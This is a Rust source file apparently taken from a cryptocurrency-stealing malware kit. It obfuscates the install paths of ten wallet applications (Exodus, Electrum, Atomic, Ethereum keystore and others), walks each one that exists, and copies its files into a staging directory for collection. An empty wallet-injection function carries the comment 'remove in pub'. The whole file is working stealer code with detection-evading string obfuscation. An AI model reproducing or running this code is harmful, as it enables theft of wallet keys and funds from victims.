use std::collections::HashMap;
use walkdir::WalkDir;



pub fn grab(path: String) {
    grab_cold_wallets(path.clone());
    inject_wallets();
}

pub fn grab_cold_wallets(path_in: String) {
    let mut hm: HashMap<String, String> = HashMap::new();
    hm.insert(
        obfstr::obfstr!("AtomicWallet").to_string(),
        obfstr::obfstr!("%APPDATA%\\atomic\\Local Storage\\leveldb\\").to_string(),
    );
    hm.insert(obfstr::obfstr!("Exodus").to_string(), obfstr::obfstr!("%APPDATA%\\exodus\\exodus.wallet\\").to_string());
    hm.insert(
        obfstr::obfstr!("JaxxWallet").to_string(),
        obfstr::obfstr!("%APPDATA%\\Wallets\\Jaxx\\com.liberty.jaxx\\IndexedDB\\file__0.indexeddb.leveldb\\").to_string());
    hm.insert(obfstr::obfstr!("Electrum").to_string(), obfstr::obfstr!("%APPDATA%\\Electrum\\wallets\\").to_string());
    hm.insert(obfstr::obfstr!("ByteCoin").to_string(), obfstr::obfstr!("%APPDATA%\\bytecoin\\").to_string());
    hm.insert(obfstr::obfstr!("Ethereum").to_string(), obfstr::obfstr!("%APPDATA%\\Ethereum\\keystore\\").to_string());
    hm.insert(obfstr::obfstr!("Guarda").to_string(), obfstr::obfstr!("%APPDATA%\\Guarda\\\\Local Storage\\leveldb\\").to_string());
    hm.insert(obfstr::obfstr!("Coinomi").to_string(), obfstr::obfstr!("%LOCALAPPDATA%\\Coinomi\\Coinomi\\wallets\\").to_string());
    hm.insert(obfstr::obfstr!("Armory").to_string(), obfstr::obfstr!("%APPDATA%\\Armory\\").to_string());
    hm.insert(obfstr::obfstr!("ZCash").to_string(), obfstr::obfstr!("%APPDATA%\\Zcash\\").to_string());

    for (key, value) in hm.iter() {
        let string_path = value.replace("%APPDATA%", &std::env::var("APPDATA").unwrap()).replace("%LOCALAPPDATA%", &std::env::var("LOCALAPPDATA").unwrap());
        let path = std::path::Path::new(&string_path);
        if path.exists() {
            unsafe { crate::WALLETS += 1; }

            let _ = std::fs::create_dir_all(format!(
                "{path_in}\\Wallets\\{}\\",
                key
            ));

            let walker = WalkDir::new(string_path).into_iter();

            for entry in walker {
                let entry = entry.unwrap();
                let _ = std::fs::copy(
                    entry.path(),
                    format!(
                        "{path_in}\\Wallets\\{}\\{}",
                        key,
                        entry.path().file_name().unwrap().to_str().unwrap()
                    ),
                );
            }
        }
    }
}

pub fn inject_wallets() {} // remove in pub